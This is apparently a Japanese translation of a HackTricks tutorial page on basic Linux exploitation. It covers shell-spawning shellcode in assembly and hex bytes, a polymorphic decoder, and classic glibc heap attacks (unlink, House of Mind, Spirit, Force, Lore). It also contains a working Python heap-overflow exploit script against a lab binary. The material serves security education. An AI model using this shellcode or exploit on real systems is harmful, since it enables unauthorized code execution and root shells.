# Linux Exploiting (Basic) (SPA)

{{#include ../../banners/hacktricks-training.md}}

## **2.SHELLCODE**

カーネルの割り込みを表示する: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR_execve 11\
exit(0); // \_\_NR_exit 1

xor eax, eax ; eaxをクリア\
xor ebx, ebx ; ebx = 0 なので引数はなし\
mov al, 0x01 ; eax = 1 —> \_\_NR_exit 1\
int 0x80 ; システムコールを実行

**nasm -f elf assembly.asm** —> .oファイルを返す\
**ld assembly.o -o shellcodeout** —> アセンブリコードから形成された実行可能ファイルを得て、**objdump**でオペコードを取得できる\
**objdump -d -Mintel ./shellcodeout** —> 実際に私たちのシェルコードであることを確認し、オペコードを取得する

**シェルコードが機能することを確認する**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているか確認するには、前のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA_COMPILADO**に表示される必要があります。

シェルコードを作成する際にトリックを行うことができます。最初の命令はcallへのジャンプです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。call命令の後に必要な文字列を入れているため、そのEIPを使って文字列を指し示し、さらにコードの実行を続けることができます。

EJ **トリック (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJを使用したスタック(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

小さなコードで、プロセスに関連付けられたメモリページを走査し、そこに保存されたシェルコードを探します（シェルコードに置かれた署名を探します）。コードを注入するための小さなスペースしかない場合に便利です。

**Shellcodes polimórficos**

暗号化されたシェルで構成されており、それを復号化してジャンプする小さなコードを持っています。Call-Popのトリックを使用して、これは**暗号化されたシーザーの例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.補完的手法**

**Murat技術**

Linuxではすべてのプログラムは0xbfffffffからマッピングされます。

Linuxで新しいプロセスのスタックがどのように構築されるかを見ることで、プログラムがシェルコードだけを持つ環境で起動されるようにエクスプロイトを開発できます。このアドレスは次のように計算できます: addr = 0xbfffffff - 4 - strlen(完全な実行可能ファイル名) - strlen(shellcode)

このようにして、シェルコードを持つ環境変数のアドレスを簡単に取得できます。

これは、execle関数が必要な環境変数だけを持つ環境を作成できるため可能です。

##

###

###

###

###

### **フォーマット文字列によるバッファオーバーフロー**

**sprintf**はフォーマットされた文字列を**変数に移動**します。したがって、文字列の**フォーマット**を悪用して、内容がコピーされる**変数でバッファオーバーフローを引き起こす**ことができます。\
例えば、ペイロード`%.44xAAAA`は**変数に44B+"AAAA"を書き込み**、これがバッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

> [!CAUTION]
> 現在、これをエクスプロイトするのは非常に**奇妙です**。

**`atexit()`**は、**他の関数がパラメータとして渡される**関数です。これらの**関数**は、**`exit()`**を実行するか、**main**の**戻り**時に**実行されます**。\
これらの**関数**のいずれかの**アドレス**をシェルコードを指すように**変更**できれば、**プロセスの制御を得る**ことができますが、これは現在より複雑です。\
現在、実行される**関数のアドレス**は、いくつかの構造の背後に**隠されており**、最終的に指すアドレスは関数のアドレスではなく、**XORで暗号化され**、**ランダムキー**でオフセットされています。したがって、現在この攻撃ベクターは**x86**および**x64_86**ではあまり役に立ちません。\
**暗号化関数**は**`PTR_MANGLE`**です。**m68k、mips32、mips64、aarch64、arm、hppa**などの**他のアーキテクチャ**は、**暗号化**関数を実装していません。なぜなら、それは**入力として受け取ったものと同じ**を返すからです。したがって、これらのアーキテクチャはこのベクターで攻撃可能です。

### **setjmp() & longjmp()**

> [!CAUTION]
> 現在、これをエクスプロイトするのは非常に**奇妙です**。

**`setjmp()`**は**コンテキスト**（レジスタ）を**保存**します。\
**`longjmp()`**は**コンテキスト**を**復元**します。\
**保存されたレジスタ**は: `EBX, ESI, EDI, ESP, EIP, EBP`\
EIPとESPは**`PTR_MANGLE`**関数によって渡されるため、この攻撃に対して脆弱な**アーキテクチャは上記と同じ**です。\
エラー回復や割り込みに役立ちます。\
ただし、私が読んだところによると、他のレジスタは保護されていないため、**関数内で`call ebx`、`call esi`、または`call edi`**がある場合、制御を奪うことができます。また、EBPを変更してESPを変更することもできます。

**C++におけるVTableとVPTR**

各クラスには**Vtable**があり、これは**メソッドへのポインタの配列**です。

各**クラス**のオブジェクトには**VPtr**があり、これはそのクラスの配列への**ポインタ**です。VPtrは各オブジェクトのヘッダーの一部であるため、**VPtrの上書き**が成功すれば、ダミーメソッドを指すように**変更**でき、関数を実行するとシェルコードに飛ぶことになります。

## **予防措置と回避策**

###

**Libsafeの置き換え**

次のようにアクティブ化されます: LD_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

不安全な関数への呼び出しを安全なものに置き換えます。標準化されていません。（x86専用、-fomit-frame-pointerでコンパイルされたものには適用されず、静的コンパイルには適用されず、すべての脆弱な関数が安全になるわけではなく、LD_PRELOADはsuidバイナリでは機能しません）。

**ASCIIアーマードアドレス空間**

0x00000000から0x00ffffffまでの共有ライブラリを読み込むことで、常にバイト0x00が存在するようにします。しかし、これは実際にはほとんどの攻撃を防ぐことはできず、特にリトルエンディアンでは効果が薄いです。

**ret2plt**

ROPを実行して、strcpy@plt（pltの）関数を呼び出し、GOTのエントリを指し、呼び出したい関数の最初のバイトをコピーします（system()）。次に、GOT+1を指してsystem()の2バイト目をコピーします…最終的にGOTに保存されたアドレスを呼び出すことになります。

**chroot()によるサンドボックス**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします。

管理者は次のようにしてこれらのサンドボックスから出ることができます: mkdir foo; chroot foo; cd ..

**コードのインストゥルメンテーション**

Valgrind —> エラーを探します。\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 ヒープオーバーフロー: 基本的なエクスプロイト**

**割り当てられたチャンク**

prev_size |\
size | —ヘッダー\
\*mem | データ

**空きチャンク**

prev_size |\
size |\
\*fd | 前方チャンクへのポインタ\
\*bk | 後方チャンクへのポインタ —ヘッダー\
\*mem | データ

空きチャンクは双方向リスト（bin）にあり、2つの空きチャンクが隣接することはありません（結合されます）。

“size”には次のビットが含まれています: 前のチャンクが使用中かどうか、チャンクがmmap()によって割り当てられたかどうか、チャンクがプライマリアリーナに属するかどうか。

チャンクを解放する際に、隣接するチャンクのいずれかが空いている場合、これらはunlink()マクロを介して結合され、新しい大きなチャンクがfrontlink()に渡されて適切なbinに挿入されます。

unlink(){\
BK = P->bk; —> 新しいチャンクのBKは、以前に空いていたチャンクのBKです。\
FD = P->fd; —> 新しいチャンクのFDは、以前に空いていたチャンクのFDです。\
FD->bk = BK; —> 次のチャンクのBKは新しいチャンクを指します。\
BK->fd = FD; —> 前のチャンクのFDは新しいチャンクを指します。\
}

したがって、P->bkをシェルコードのアドレスに、P->fdをGOTまたはDTORSのエントリのアドレス-12に変更できれば、次のようになります:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor_end\_\_ - 12) + 12) = \&shellcode

これにより、プログラム終了時にシェルコードが実行されます。

さらに、unlink()の4番目の文は何かを書き込み、シェルコードはこれに合わせて修正される必要があります:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor_end\_\_ - 12) —> これはシェルコードの8バイト目から4バイトを書き込むため、シェルコードの最初の命令はこれをスキップして残りのシェルコードに飛ぶためのjmpである必要があります。

したがって、エクスプロイトは次のように作成されます:

buffer1にシェルコードを入れ、最初にjmpを入れてnopsまたは残りのシェルコードに飛ぶようにします。

シェルコードの後に、次のチャンクのprev_sizeとsizeフィールドに到達するまでパディングを入れます。これらの場所に0xfffffff0を入れ（prev_sizeが空いていることを示すビットを持つように上書きされる）、sizeに“-4”（0xfffffffc）を入れます（3番目のチャンクで2番目が実際に空いているかどうかを確認する際に、変更されたprev_sizeに行くようにします）-> これにより、free()が調査すると、3番目のsizeに行きますが、実際には2番目-4に行き、2番目のチャンクが空いていると考えます。そして、**unlink()**を呼び出します。

unlink()を呼び出すと、P->fdとして2番目のチャンクの最初のデータを使用するため、そこに上書きしたいアドレス-12（FD->bkに12を加算します）を入れます。そして、そのアドレスに2番目のチャンクで見つけた2番目のアドレスを入れます。これはシェルコードへのアドレスであることが望ましいです（偽のP->bk）。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12バイトのパディング**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I”, 0xfffffff0) #前のチャンクが空いているビットが1であることが重要です**

**fake_size = pack("\<I”, 0xfffffffc) #-4、3番目のチャンクのsizeが4バイト後ろにあると考えさせるため（prev_sizeを指す）**

**addr_sc = pack("\<I", 0x0804a008 + 8) #ペイロードの最初に8バイトのパディングを入れます**

**got_free = pack("\<I", 0x08048300 - 12) #free()のアドレスをplt-12に（シェルコードを実行するために上書きされるアドレス）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ペイロードは最初に8バイトのパディングから始まります**

**payload += prev_size + fake_size + got_free + addr_sc #2番目のチャンクを変更し、got_freeはaddr_sc + 12のアドレスを保存するように指します**

**os.system("./8.3.o " + payload)**

**unset() 逆順で解放（wargame）**

3つの連続したチャンクを制御しており、予約された順序とは逆に解放されます。

その場合:

チャンクcにシェルコードを置きます。

チャンクaを使用してbを上書きし、sizeがPREV_INUSEビットをオフにして、チャンクaが空いていると考えさせます。

さらに、bのヘッダーのsizeを-4に上書きします。

これにより、プログラムは「a」が空いていると考え、binに入るため、unlink()を呼び出します。しかし、PREV_SIZEヘッダーが-4であるため、実際にはb+4から始まるチャンクだと考えます。つまり、b+4から始まるチャンクにunlink()を行い、b+12にfdポインタがあり、b+16にbkポインタがあります。

このようにして、bkにシェルコードのアドレスを、fdにputs()のアドレス-12を置くことで、ペイロードを得ることができます。

**フロントリンク技術**

何かを解放するときに、隣接するチャンクが空いていない場合にフロントリンクと呼ばれ、unlink()ではなく直接frontlink()が呼び出されます。

mallocが攻撃されるときに決して解放されない場合に有用な脆弱性です。

必要なもの:

データ入力関数でオーバーフローできるバッファ

これに隣接する解放されるべきバッファで、前のバッファのオーバーフローによってヘッダーのfdフィールドが変更されます。

サイズが512より大きいが前のバッファより小さいバッファ

この3番目のバッファのprev_sizeを上書きできるように、前に宣言されたバッファ

このようにして、2つのmallocを制御不能に上書きし、1つを制御可能に解放することで、エクスプロイトを作成できます。

**double free()脆弱性**

同じポインタでfree()を2回呼び出すと、2つのbinが同じアドレスを指します。

1つを再利用しようとすると、問題なく割り当てられます。別のものを使用しようとすると、同じスペースが割り当てられるため、ポインタ「fd」と「bk」が前の予約によって書き込まれるデータで偽装されます。

**free()後**

以前に解放されたポインタが再び制御なしで使用されます。

## **8 ヒープオーバーフロー: 高度なエクスプロイト**

unlink()とFrontLink()の技術は、unlink()関数を変更することで削除されました。

**The house of mind**

任意のコードを実行するには、free()を1回呼び出すだけで済みます。前のチャンクによってオーバーフローされ、解放される可能性のある2番目のチャンクを探すことが重要です。

free()の呼び出しはpublic_fREe(mem)を呼び出し、これを行います:

mstate ar_ptr;

mchunkptr p;

…

p = mem2chunk(mem); —> チャンクが始まるアドレスへのポインタを返します（mem-8）

…

ar_ptr = arena_for_chunk(p); —> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

…

\_int_free(ar_ptr, mem);

}

\[1]では、sizeフィールドのNON_MAIN_ARENAビットを確認し、このビットを変更してtrueを返すようにし、heap_for_ptr()を実行します。これにより、memに対してandを適用し、最も重要でない2.5バイトを0にします（この場合、0x0804a000から0x08000000になります）そして、0x08000000->ar_ptrにアクセスします（heap_info構造体のように）。

このようにして、例えば0x0804a000でチャンクを制御でき、**0x081002a0**でチャンクが解放されると、0x08100000に到達し、任意のものを書き込むことができます。例えば**0x0804a000**。この2番目のチャンクが解放されると、heap_for_ptr(ptr)->ar_ptrは0x08100000に書き込んだものを返します（なぜなら、前述のandが0x081002a0に適用され、最初の4バイトの値が得られるからです）。

このようにして、\_int_free(ar_ptr, mem)が呼び出されます。つまり、**\_int_free(0x0804a000, 0x081002a0)**\
**\_int_free(mstate av, Void_t\* mem){**\
…\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

前述のように、avの値を制御できることがわかります。これは、解放されるチャンクに書き込んだものです。

unsorted_chunksが定義されているように、次のことがわかります:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

したがって、av->bins\[2]に\_\_DTOR_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR_END\_\_に2番目のチャンクのアドレスが書き込まれます。

つまり、最初のチャンクの先頭に\_\_DTOR_END\_\_-12のアドレスを何度も入れる必要があります。なぜなら、av->bins\[2]がそこから取得するからです。

2番目のチャンクのアドレスに最後の5つのゼロがある場合、最初のチャンクのアドレスを書き込む必要があります。これにより、heap_for_ptr()はar_ptrが最初のチャンクの先頭にあると考え、av->bins\[2]をそこから取得します。

2番目のチャンクでは、最初のチャンクのprev_sizeを0x0cに、sizeを何かに変更して-> NON_MAIN_ARENAを有効にします。

次に、チャンク2にnopsの山を置き、最後にシェルコードを置きます。

このようにして、\_int_free(TROZO1, TROZO2)が呼び出され、次にTROZO2のprev_sizeのアドレスが\_\_DTOR_END\_\_に書き込まれ、シェルコードに飛びます。

この技術を適用するには、ペイロードを少し複雑にするためにいくつかの要件を満たす必要があります。

この技術は、unlinkに対してほぼ同じパッチが適用されたため、もはや適用できません。新しいポインタが自分自身を指しているかどうかを比較します。

**Fastbin**

これはThe house of mindのバリエーションです。

次のコードを実行するために必要です。これは、\_int_free()関数の最初のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin_index(size)] —> fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

このようにして、fbに関数のアドレスを置くと、そのアドレスに上書きされたチャンクのアドレスが置かれます。これには、アリーナがdtorsのアドレスに近い必要があります。より正確には、av->max_fastが上書きされるアドレスにある必要があります。

The House of Mindで、avの位置を制御できることがわかりました。

したがって、sizeフィールドに8 + NON_MAIN_ARENA + PREV_INUSEのサイズを置くと、fastbin_index()はfastbins\[-1]を返し、av->max_fastを指します。

この場合、av->max_fastは上書きされるアドレスになります（指すのではなく、その位置が上書きされます）。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません。-> 先ほど解放されたチャンクのサイズが8であるため、この偽のチャンクには8より大きなサイズを置くだけで済みます（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを置く必要があります）。

さらに、この偽のチャンクはav->system_memより小さくなければなりません。av->system_memは1848バイト先にあります。

\_\_DTOR_END\_のゼロとGOTの少ないアドレスのため、これらのセクションのアドレスは上書きするのに適していないため、スタックを攻撃するためにfastbinを適用する方法を見てみましょう。

別の攻撃方法は、**av**をスタックにリダイレクトすることです。

sizeを8ではなく16に変更すると、fastbin_index()はfastbins\[0]を返し、これを使用してスタックを上書きできます。

これには、canaryやスタック内の奇妙な値がない必要があります。実際、次のような状態でなければなりません: 4バイトのゼロ + EBP + RET

4バイトのゼロは、**av**がこのアドレスにある必要があり、**av**の最初の要素は0である必要があります。

**av->max_fast**はEBPになり、制約を回避するための値になります。

**av->fastbins\[0]**は**p**のアドレスで上書きされ、RETになります。これにより、シェルコードに飛びます。

さらに、**av->system_mem**（スタックの位置から1484バイト上）には、チェックを回避するのに十分なゴミが含まれます。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません。-> 解放されたチャンクのサイズが16であるため、この偽のチャンクには8より大きなサイズを置くだけで済みます（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを置く必要があります）。

**The House of Spirit**

この場合、攻撃者によって変更可能なmallocへのポインタを持つことを目指します（例えば、ポインタがスタックの変数へのオーバーフローの下にある場合）。

このようにして、このポインタを任意の場所に指すようにできます。しかし、どの場所も有効ではなく、偽のチャンクのサイズはav->max_fastより小さく、具体的には将来のmalloc()呼び出しで要求されるサイズ+8と等しくなければなりません。したがって、この脆弱なポインタの後にmalloc(40)が呼び出されることがわかっている場合、偽のチャンクのサイズは48でなければなりません。

例えば、プログラムがユーザーに数値を尋ねる場合、48を入力してmallocの変更可能なポインタを次の4バイト（運が良ければEBPに属する可能性がある）に指すことができます。こうすることで、48は後ろに残り、サイズヘッダーのように見えます。さらに、ptr-4+48のアドレスは複数の条件を満たす必要があります（この場合、ptr=EBP）。つまり、8 < ptr-4+48 < av->system_mem。

これが満たされると、次のmallocがmalloc(40)と呼ばれるとき、EBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むことができる場合、EBPとEIPの両方を任意のアドレスに上書きできます。

これは、free()が解放する際に、スタックのEBPを指すアドレスに新しいmalloc()のための完璧なサイズのチャンクがあることを記録するためだと思います。したがって、そのアドレスが割り当てられます。

**The House of Force**

必要なもの:

- wildernessを上書きできるチャンクへのオーバーフロー
- ユーザーによって定義されたサイズでmalloc()を呼び出す
- ユーザーによって定義されたデータを持つmalloc()の呼び出し

最初に、wildernessのチャンクのサイズを非常に大きな値（0xffffffff）で上書きします。これにより、十分に大きなメモリ要求は\_int_malloc()で処理され、ヒープを拡張する必要がなくなります。

次に、av->topを攻撃者の制御下にあるメモリ領域（スタックなど）を指すように変更します。av->topには\&EIP - 8が置かれます。

av->topを攻撃者の制御下にあるメモリ領域を指すように上書きする必要があります:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victimは現在のwildernessチャンクのアドレスの値（現在のav->top）を取得し、remainderはそのアドレスにmalloc()によって要求されたバイト数を加えたものです。したがって、\&EIP-8が0xbffff224にあり、av->topが0x080c2788を含む場合、次のmalloc()のためにav->topが$EIP-8を指すようにするために、制御されたmallocで予約する必要がある量は次のようになります:

0xbffff224 - 0x080c2788 = 3086207644。

このようにして、av->topに変更された値が保存され、次のmallocはEIPを指し、上書きできるようになります。

新しいwildernessチャンクのサイズが、最後のmalloc()によって行われた要求よりも大きいことが重要です。つまり、wildernessが\&EIP-8を指している場合、サイズはスタックのEBPフィールドに正確に配置されます。

**The House of Lore**

**SmallBinの破損**

解放されたチャンクは、そのサイズに基づいてbinに挿入されます。しかし、挿入される前にunsorted binsに保存されます。チャンクが解放されると、すぐにそのbinに入るのではなく、unsorted binsに留まります。次に、新しいチャンクが予約され、以前に解放されたものが役立つ場合、それを返しますが、より大きなものが予約されると、unsorted binsにある解放されたチャンクは適切なbinに入れられます。

脆弱なコードに到達するためには、メモリ要求がav->max_fast（通常72）より大きく、MIN_LARGE_SIZE（512）より小さくなければなりません。

binに要求されるサイズに適したチャンクがある場合、それは解放された後に返されます:

bck = victim->bk; 前のチャンクを指し、変更できる唯一の情報です。

bin->bk = bck; 前のチャンクが最後のチャンクになります。bckがスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; このリストを閉じて、これがbinを指すようにします。

必要なもの:

2つのmallocを予約し、最初のものが解放された後にオーバーフローできるようにし、2番目のチャンクが解放されてそのbinに入るようにします（つまり、2番目のチャンクよりも大きなmallocを予約してからオーバーフローを行います）。

攻撃者が選択したアドレスに割り当てられるmallocは、攻撃者によって制御される必要があります。

目的は次のとおりです。解放されたヒープの下にあるチャンクにオーバーフローでき、binにある場合、bkポインタを変更できます。bkポインタを変更し、このチャンクがリストの最初になると、mallocがこのチャンクの次のチャンクが偽のアドレスにあると考えます（スタックやGOTなど）。したがって、別のチャンクが再度予約され、攻撃者がその権限を持っている場合、希望する位置にチャンクが与えられ、そこに書き込むことができます。

変更されたチャンクを解放した後は、解放されたものよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクはunsorted binsから出て、適切なbinに入ります。

binに入ったら、オーバーフローによってbkポインタを変更して、上書きしたいアドレスを指すようにします。

このようにして、binはmalloc()が十分に呼び出されるのを待つ必要があります。これにより、変更されたbinが再度使用され、次のチャンクが偽のアドレスにあると考えられます。そして、次に必要なチャンクが提供されます。

脆弱性をできるだけ早く実行するには、次のようにするのが理想的です: 脆弱なチャンクの予約、変更されるチャンクの予約、このチャンクを解放、変更されるチャンクよりも大きなチャンクを予約、チャンクを変更（脆弱性）、脆弱なサイズと同じサイズのチャンクを予約、そしてこのチャンクが選択したアドレスを指すように予約されます。

この攻撃を防ぐために、チャンクが「偽」でないことを確認するための典型的なチェックが使用されます: bck->fdがvictimを指しているかどうかを確認します。つまり、私たちのケースでは、スタックで指されている偽のチャンクのポインタfd*がvictimを指しているかどうかを確認します。この保護を回避するために、攻撃者は何らかの方法で（おそらくスタックを介して）適切なアドレスにvictimのアドレスを書き込むことができる必要があります。これにより、真のチャンクのように見えるようになります。

**LargeBinの破損**

前述の要件と同様の要件が必要であり、さらに、予約されたチャンクは512より大きくなければなりません。

攻撃は前述のように、bkポインタを変更する必要があり、すべてのmalloc()呼び出しが必要ですが、さらに、変更されたチャンクのサイズをそのサイズ - nbが<MINSIZEになるように変更する必要があります。

例えば、サイズを1552に設定すると、1552 - 1544 = 8 < MINSIZE（引き算は負になってはいけません。なぜなら、unsignedが比較されるからです）。

さらに、さらに複雑にするためのパッチが導入されました。

**ヒープスプレー**

基本的には、可能な限りすべてのメモリを予約し、これをnopsのマットレスとシェルコードで埋めることを意味します。また、マットレスとして0x0cを使用します。これにより、0x0c0c0c0cのアドレスに飛ぶことを試み、これにより、呼び出されるアドレスがこのマットレスで上書きされると、そこに飛ぶことになります。基本的に、戦術は、できるだけ多くの予約を行い、ポインタが上書きされるかどうかを確認し、0x0c0c0c0cに飛ぶことを期待してnopsがあることを確認します。

**ヒープ風水**

予約と解放を通じて、メモリをセグメント化し、空きチャンクの間に予約されたチャンクを配置します。オーバーフローするバッファは、これらの卵の1つに配置されます。

**objdump -d 実行可能ファイル** —> 関数を逆アセンブル\
**objdump -d ./PROGRAMA | grep FUNCION** —> 関数アドレスを取得\
**objdump -d -Mintel ./shellcodeout** —> 実際にシェルコードであることを確認し、OpCodesを取得\
**objdump -t ./exec | grep varBss** —> シンボルテーブル、変数と関数のアドレスを取得\
**objdump -TR ./exec | grep exit(func lib)** —> ライブラリ関数のアドレスを取得（GOT）\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOTで上書きするputsのアドレスを取得\
**objdump -D ./exec** —> pltのエントリまで全てを逆アセンブル\
**objdump -p -/exec**\
**Info functions strncmp —>** gdbでの関数情報

## 興味深いコース

- [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
- [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
- [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **参考文献**

- [**https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html)

{{#include ../../banners/hacktricks-training.md}}
